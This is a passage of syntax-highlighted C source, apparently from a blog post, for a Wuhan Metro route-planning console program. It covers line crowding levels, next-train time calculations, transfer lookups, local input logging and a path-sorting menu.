class="number">1</span>] = <span class="number">0.15</span>;</span><br><span class="line">	line[<span class="number">5</span>].time_interval = <span class="number">4</span>;</span><br><span class="line">	<span class="comment">//七号线</span></span><br><span class="line">	line[<span class="number">6</span>].start_number = <span class="number">1</span>;</span><br><span class="line">	line[<span class="number">6</span>].end_number = <span class="number">37</span>;</span><br><span class="line">	line[<span class="number">6</span>].crowding = <span class="number">0.15</span>;</span><br><span class="line">	line[<span class="number">6</span>].crow[<span class="number">0</span>] = <span class="number">0.65</span>;<span class="comment">//娱乐</span></span><br><span class="line">	line[<span class="number">6</span>].crow[<span class="number">1</span>] = <span class="number">0.15</span>;</span><br><span class="line">	line[<span class="number">6</span>].time_interval = <span class="number">4</span>;</span><br><span class="line">	<span class="comment">//八号线</span></span><br><span class="line">	line[<span class="number">7</span>].start_number = <span class="number">1</span>;</span><br><span class="line">	line[<span class="number">7</span>].end_number = <span class="number">26</span>;</span><br><span class="line">	line[<span class="number">7</span>].crowding = <span class="number">0.2</span>;</span><br><span class="line">	line[<span class="number">7</span>].crow[<span class="number">0</span>] = <span class="number">0.65</span>;<span class="comment">//购物</span></span><br><span class="line">	line[<span class="number">7</span>].crow[<span class="number">1</span>] = <span class="number">0.2</span>;</span><br><span class="line">	line[<span class="number">7</span>].time_interval = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：SetCrowding</span></span><br><span class="line"><span class="comment">*函数功能：按照输入时间自动确定当前路线的拥挤度</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetCrowding</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">double</span> time)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (l)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">if</span> ((time &gt;= <span class="number">450</span>) &amp;&amp; (time &lt;= <span class="number">540</span>))</span><br><span class="line">			line[<span class="number">0</span>].crowding = line[<span class="number">0</span>].crow[<span class="number">0</span>];<span class="comment">//上班时间拥挤度</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ((time &gt;= <span class="number">990</span>) &amp;&amp; (time &lt;= <span class="number">1110</span>))</span><br><span class="line">			line[<span class="number">0</span>].crowding = line[<span class="number">0</span>].crow[<span class="number">1</span>];<span class="comment">//下班时间拥挤度</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			line[<span class="number">0</span>].crowding = line[<span class="number">0</span>].crow[<span class="number">2</span>];<span class="comment">//其他时间拥挤度</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		line[<span class="number">1</span>].crowding = line[<span class="number">1</span>].crow[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">		<span class="keyword">if</span> ((time &gt;= <span class="number">450</span>) &amp;&amp; (time &lt;= <span class="number">540</span>))</span><br><span class="line">			line[<span class="number">2</span>].crowding = line[<span class="number">2</span>].crow[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ((time &gt;= <span class="number">990</span>) &amp;&amp; (time &lt;= <span class="number">1110</span>))</span><br><span class="line">			line[<span class="number">2</span>].crowding = line[<span class="number">2</span>].crow[<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			line[<span class="number">2</span>].crowding = line[<span class="number">2</span>].crow[<span class="number">2</span>];</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">		line[<span class="number">3</span>].crowding = line[<span class="number">3</span>].crow[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">		<span class="keyword">if</span> ((time &gt;= <span class="number">1140</span>) &amp;&amp; (time &lt;= <span class="number">1320</span>))</span><br><span class="line">			line[<span class="number">5</span>].crowding = line[<span class="number">5</span>].crow[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			line[<span class="number">5</span>].crowding = line[<span class="number">5</span>].crow[<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">		<span class="keyword">if</span> ((time &gt;= <span class="number">1140</span>) &amp;&amp; (time &lt;= <span class="number">1320</span>))</span><br><span class="line">			line[<span class="number">6</span>].crowding = line[<span class="number">6</span>].crow[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			line[<span class="number">6</span>].crowding = line[<span class="number">6</span>].crow[<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">		<span class="keyword">if</span> ((time &gt;= <span class="number">570</span>) &amp;&amp; (time &lt;= <span class="number">900</span>))</span><br><span class="line">			line[<span class="number">7</span>].crowding = line[<span class="number">7</span>].crow[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			line[<span class="number">7</span>].crowding = line[<span class="number">7</span>].crow[<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：SetDefaultCrowd</span></span><br><span class="line"><span class="comment">*函数功能：按照用户意愿改变当前路线拥挤度</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetDefaultCrowd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> l;</span><br><span class="line">	<span class="keyword">double</span> crowd;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入要修改的线路：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;l);</span><br><span class="line">	Log(privacy, l);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;配置当前时间拥挤度：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;crowd);</span><br><span class="line">	Log(privacy, crowd);</span><br><span class="line">	line[l - <span class="number">1</span>].crow[<span class="number">0</span>] = crowd;</span><br><span class="line">	line[l - <span class="number">1</span>].crow[<span class="number">1</span>] = crowd;</span><br><span class="line">	line[l - <span class="number">1</span>].crow[<span class="number">2</span>] = crowd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：QuerySubwayTime</span></span><br><span class="line"><span class="comment">*函数功能：按照当前站点匹配时刻表</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QuerySubwayTime</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//设计思路：起始站点6:00发车，并停留1分钟</span></span><br><span class="line">	IntiaLine();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;当前站点名称为：%s\n&quot;</span>, FindStation(l, n).name);</span><br><span class="line">	<span class="keyword">int</span> hour, minute;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入当前时间(格式形如8 30)：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;hour, &amp;minute);</span><br><span class="line">	Log(privacy, hour);</span><br><span class="line">	Log(privacy, minute);</span><br><span class="line">	<span class="keyword">int</span> time_now = hour * <span class="number">60</span> + minute;</span><br><span class="line">	<span class="comment">//从线路1号站点方向</span></span><br><span class="line">	<span class="keyword">int</span> z = GetStationTime(l, n, <span class="number">0</span>, time_now);</span><br><span class="line">	<span class="keyword">if</span>(z!=<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\t\t往 %s（%d号线） 方向的下一班列车将在 %d:%d 抵达，&quot;</span>, FindStation(l, line[l - <span class="number">1</span>].end_number).name,l, z / <span class="number">60</span>, z % <span class="number">60</span>) ;</span><br><span class="line">		<span class="keyword">if</span> ((n == <span class="number">1</span>) || (n == line[l - <span class="number">1</span>].end_number)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (z &gt;=<span class="number">1380</span>)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;且不会离开！\n&quot;</span>);</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;并在 %d:%d 离开\n&quot;</span>, (z + <span class="number">1</span>) / <span class="number">60</span>, (z + <span class="number">1</span>) % <span class="number">60</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;并在 %d:%d 离开\n&quot;</span>, (z + <span class="number">1</span>) / <span class="number">60</span>, (z + <span class="number">1</span>) % <span class="number">60</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\t\t当前时刻已经没有从 %s 出发的列车！\n&quot;</span>, FindStation(l, line[l - <span class="number">1</span>].start_number).name);</span><br><span class="line">	<span class="comment">//从线路末端发车</span></span><br><span class="line">	z = GetStationTime(l, n, <span class="number">1</span>, time_now);</span><br><span class="line">	<span class="keyword">if</span>(z!=<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\t\t往 %s （%d号线）方向的下一班列车将在 %d:%d 抵达，&quot;</span>, FindStation(l, line[l - <span class="number">1</span>].start_number).name,l, z / <span class="number">60</span>, z % <span class="number">60</span>);</span><br><span class="line">		<span class="keyword">if</span> ((n == <span class="number">1</span>) || (n == line[l - <span class="number">1</span>].end_number)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (z &gt;= <span class="number">1380</span>)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;且不会离开！\n&quot;</span>);</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;并在 %d:%d 离开\n&quot;</span>, (z + <span class="number">1</span>) / <span class="number">60</span>, (z + <span class="number">1</span>) % <span class="number">60</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;并在 %d:%d 离开\n&quot;</span>, (z + <span class="number">1</span>) / <span class="number">60</span>, (z + <span class="number">1</span>) % <span class="number">60</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\t\t当前时刻已经没有从 %s 出发的列车！\n&quot;</span>, FindStation(l, line[l - <span class="number">1</span>].end_number).name);</span><br><span class="line">	<span class="comment">//如果可以换乘</span></span><br><span class="line">		EdgeNode* p;</span><br><span class="line">		p = (struct EdgeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct EdgeNode));</span><br><span class="line">		p = s[FindNumber(l, n)].next;</span><br><span class="line">		<span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (p-&gt;line == l) &#123;</span><br><span class="line">				p = p-&gt;next;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(FindStation(l, n).name, FindStation(p-&gt;nextline, p-&gt;nextnumber + <span class="number">1</span>).name))</span><br><span class="line">			&#123;<span class="comment">//当前方向指向起点</span></span><br><span class="line">				z = GetStationTime(p-&gt;nextline, p-&gt;nextnumber + <span class="number">1</span>, <span class="number">1</span>, time_now);</span><br><span class="line">				<span class="keyword">if</span> (z != <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;\t\t往 %s （%d号线）方向的下一班列车将在 %d:%d 抵达，&quot;</span>, FindStation(p-&gt;line,line[p-&gt;line<span class="number">-1</span>].start_number).name,p-&gt;line, z / <span class="number">60</span>, z % <span class="number">60</span>);</span><br><span class="line">					<span class="keyword">if</span> ((n == <span class="number">1</span>) || (n == line[p-&gt;nextline - <span class="number">1</span>].end_number)) &#123;</span><br><span class="line">						<span class="keyword">if</span> (z &gt;= <span class="number">1380</span>)</span><br><span class="line">							<span class="built_in">printf</span>(<span class="string">&quot;且不会离开！\n&quot;</span>);</span><br><span class="line">						<span class="keyword">else</span> &#123;</span><br><span class="line">							<span class="built_in">printf</span>(<span class="string">&quot;并在 %d:%d 离开\n&quot;</span>, (z + <span class="number">1</span>) / <span class="number">60</span>, (z + <span class="number">1</span>) % <span class="number">60</span>);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> &#123;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;并在 %d:%d 离开\n&quot;</span>, (z + <span class="number">1</span>) / <span class="number">60</span>, (z + <span class="number">1</span>) % <span class="number">60</span>);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;\t\t当前时刻已经没有从 %s 出发的列车！\n&quot;</span>, FindStation(p-&gt;line, line[p-&gt;line<span class="number">-1</span>].end_number).name);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;<span class="comment">//当前方向指向终点</span></span><br><span class="line">				z = GetStationTime(p-&gt;nextline, p-&gt;nextnumber - <span class="number">1</span>, <span class="number">0</span>, time_now);</span><br><span class="line">				<span class="keyword">if</span> (z != <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;\t\t往 %s （%d号线）方向的下一班列车将在 %d:%d 抵达，&quot;</span>, FindStation(p-&gt;line, line[p-&gt;line - <span class="number">1</span>].end_number).name,p-&gt;line, z / <span class="number">60</span>, z % <span class="number">60</span>);</span><br><span class="line">					<span class="keyword">if</span> ((n == <span class="number">1</span>) || (n == line[p-&gt;nextline - <span class="number">1</span>].end_number)) &#123;</span><br><span class="line">						<span class="keyword">if</span> (z &gt;= <span class="number">1380</span>)</span><br><span class="line">							<span class="built_in">printf</span>(<span class="string">&quot;且不会离开！\n&quot;</span>);</span><br><span class="line">						<span class="keyword">else</span> &#123;</span><br><span class="line">							<span class="built_in">printf</span>(<span class="string">&quot;并在 %d:%d 离开\n&quot;</span>, (z + <span class="number">1</span>) / <span class="number">60</span>, (z + <span class="number">1</span>) % <span class="number">60</span>);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> &#123;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;并在 %d:%d 离开\n&quot;</span>, (z + <span class="number">1</span>) / <span class="number">60</span>, (z + <span class="number">1</span>) % <span class="number">60</span>);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;\t\t当前时刻已经没有从 %s 出发的列车！\n&quot;</span>, FindStation(p-&gt;line, line[p-&gt;line - <span class="number">1</span>].start_number).name);</span><br><span class="line">			&#125;</span><br><span class="line">			p = p-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：GetStationTime</span></span><br><span class="line"><span class="comment">*函数功能：根据站点和方向及当前时间确定最近地铁的到达时间</span></span><br><span class="line"><span class="comment">*返回类型：int类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetStationTime</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> n, <span class="keyword">int</span> direction, <span class="keyword">double</span> time)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (direction == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> x = <span class="number">3</span> * (n - <span class="number">1</span>);<span class="comment">//间隔时间</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(FindStation(l, n).name, FindStation(l, <span class="number">1</span>).name))</span><br><span class="line">			x = <span class="number">0</span>;<span class="comment">//如果当前站点为起点，则间隔时间为0</span></span><br><span class="line">		<span class="keyword">int</span> y = <span class="number">360</span> + x;<span class="comment">//最早一班车到达时间</span></span><br><span class="line">		<span class="keyword">while</span> ((y+<span class="number">1</span>) &lt; time)<span class="comment">//这里加1是停车时间</span></span><br><span class="line">		&#123;</span><br><span class="line">			y += line[l - <span class="number">1</span>].time_interval;<span class="comment">//下一班车</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (((y - x) &lt;= <span class="number">1380</span>)&amp;&amp;(y&gt;=<span class="number">360</span>))<span class="comment">//是否有列车</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> y;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (direction == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> x = <span class="number">3</span> * (line[l - <span class="number">1</span>].end_number - n);<span class="comment">//间隔时间</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(FindStation(l, n).name, FindStation(l, line[l - <span class="number">1</span>].end_number).name))</span><br><span class="line">			x = <span class="number">0</span>;<span class="comment">//如果当前站点为起点，则间隔时间为0</span></span><br><span class="line">		<span class="keyword">int</span> y = <span class="number">360</span> + x;</span><br><span class="line">		<span class="keyword">while</span> ((y+<span class="number">1</span>) &lt; time)</span><br><span class="line">		&#123;</span><br><span class="line">			y += line[l - <span class="number">1</span>].time_interval;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (((y - x) &lt;= <span class="number">1380</span>)&amp;&amp;(y&gt;=<span class="number">360</span>))<span class="comment">//是否有列车</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> y;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：SetCurrentTime</span></span><br><span class="line"><span class="comment">*函数功能：改变当前时间</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetCurrentTime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;--------------------设置时间--------------------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入当前时间（格式如12 30）：&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> hour, minute;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp; hour, &amp;minute);</span><br><span class="line">	Log(privacy, hour);</span><br><span class="line">	Log(privacy, minute);</span><br><span class="line">	CurrentTime = hour * <span class="number">60</span> + minute;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;当前时间设置成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：Log</span></span><br><span class="line"><span class="comment">*函数功能：记录用户输入操作并写入文件</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Log</span><span class="params">(<span class="keyword">int</span> privacy,<span class="keyword">double</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (privacy == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//获取当前时间</span></span><br><span class="line">		<span class="keyword">time_t</span> nowtime;<span class="comment">//时间戳</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">today</span>;</span></span><br><span class="line">		time(&amp;nowtime);</span><br><span class="line">		today = gmtime(&amp;nowtime);</span><br><span class="line">		<span class="keyword">char</span>* filename = <span class="string">&quot;C:\\Users\\15242\\source\\repos\\Wuhan Metro 2.0\\DailyLog.txt&quot;</span>;</span><br><span class="line">		FILE* fp = fopen(filename, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">		<span class="built_in">fprintf</span>(fp, <span class="string">&quot;%d/%d/%d  %d:%d:%d   %4.0f\n&quot;</span>, today-&gt;tm_year + <span class="number">1900</span>,<span class="number">1</span>+ today-&gt;tm_mon, today-&gt;tm_mday,<span class="number">8</span>+ today-&gt;tm_hour, today-&gt;tm_min, today-&gt;tm_sec, x);</span><br><span class="line">		fclose(fp);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// !FUNCTION_H</span></span></span><br></pre></td></tr></table></figure>
<h3 id="dealpathh"><a class="markdownIt-Anchor" href="#dealpathh"></a> DealPath.h</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span>  DEALPATH_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEALPATH_H</span></span><br><span class="line"><span class="comment">//在Functions.h中，利用DFS找到两点间的所有路径</span></span><br><span class="line"><span class="comment">//在本文件中，提供函数：</span></span><br><span class="line"><span class="comment">//1.对所有路径进行排序，筛选出3条路径并进行打印</span></span><br><span class="line"><span class="comment">//2.对1中3条路径，提供按时间，距离，换乘次数和拥挤度排序等功能</span></span><br><span class="line"><span class="comment">//3.进行路径界面操作的主函数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Structs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span> (disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//实现部分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：QueryPath</span></span><br><span class="line"><span class="comment">*函数功能：查询路径的主函数</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QueryPath</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;--------------------查询路径--------------------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入起点和终点（格式形如 1 27 2 21）：&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> l1, n1, l2, n2;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;l1, &amp;n1, &amp;l2, &amp;n2);</span><br><span class="line">	Log(privacy, l1);</span><br><span class="line">	Log(privacy, n1);</span><br><span class="line">	Log(privacy, l2);</span><br><span class="line">	Log(privacy, n2);</span><br><span class="line">	pathnumber = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">10</span>; i++)</span><br><span class="line">		IntiaPath(i);</span><br><span class="line">	DFS(l1, n1, l2, n2);</span><br><span class="line">	HandlePath();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;可提供选择：1.按照时间排序（不考虑拥挤度）   2.按照时间排序（考虑拥挤度）\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;            3.按照费用排序                   4.按照综合拥挤度排序\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;            5.按照换乘次数排序               6.过滤拥挤度路线\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;            0.返回上一级\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> choice = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (choice)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请输入选择：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">		Log(privacy, choice);</span><br><span class="line">		<span class="keyword">switch</span> (choice)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			SortPath(<span class="number">1</span>);</span><br><span class="line">			PrintPath(<span class="number">0</span>);</span><br><span class="line">			system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			SortPath(<span class="number">2</span>);</span><br><span class="line">			PrintPath(<span class="number">1</span>);</span><br><span class="line">			system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			SortPath(<span class="number">3</span>);</span><br><span class="line">			PrintPath(<span class="number">0</span>);</span><br><span class="line">			system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			SortPath(<span class="number">1</span>);</span><br><span class="line">			SortPath(<span class="number">4</span>);</span><br><span class="line">			PrintPath(<span class="number">0</span>);</span><br><span class="line">			system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			SortPath(<span class="number">5</span>);</span><br><span class="line">			PrintPath(<span class="number">0</span>);</span><br><span class="line">			system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			SetCrowdRange();</span><br><span class="line">			PrintPath(<span class="number">0</span>);</span><br><span class="line">			system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：PrintPath</span></span><br><span class="line"><span class="comment">*函数功能：打印出三条路径及路径信息</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintPath</span><span class="params">(<span class="keyword">int</span> flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FILE* fp;</span><br><span class="line">	fp = fopen(<span class="string">&quot;C:\\Users\\15242\\source\\repos\\Wuhan Metro 2.0\\Path.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> k;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> z = <span class="number">0</span>; z &lt; <span class="number">3</span>; z++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (print[z] == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">fprintf</span>(fp,<span class="string">&quot;没有更多路径可以展示！\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		